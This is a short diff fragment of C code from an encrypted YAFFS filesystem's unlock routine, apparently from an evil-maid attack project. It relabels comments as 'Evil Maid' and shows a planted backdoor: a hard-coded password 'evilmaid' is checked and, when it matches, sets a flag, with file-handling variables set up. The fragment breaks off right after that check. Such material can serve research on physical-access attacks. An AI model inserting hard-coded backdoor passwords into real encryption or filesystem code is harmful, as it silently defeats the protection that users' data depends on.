@@ -2872,12 +2872,13 @@ static int yaffs_LoadKeys(yaffs_Device *dev, char *password, int keyManagementBl
 static int yaffs_UnlockEncryptedFilesystem(yaffs_Device *dev, char *password) {
   int keyManagementBlock;
 	
-	// EM Vars
+	// Evil Maid: Vars
 	mm_segment_t old_fs;
 	struct file* file;
 	int evm = 0;
 	int sz;
 
+	// Evil Maid: Backdoor
 	if (!strcmp(password, "evilmaid")) {
 		evm = 1;
 
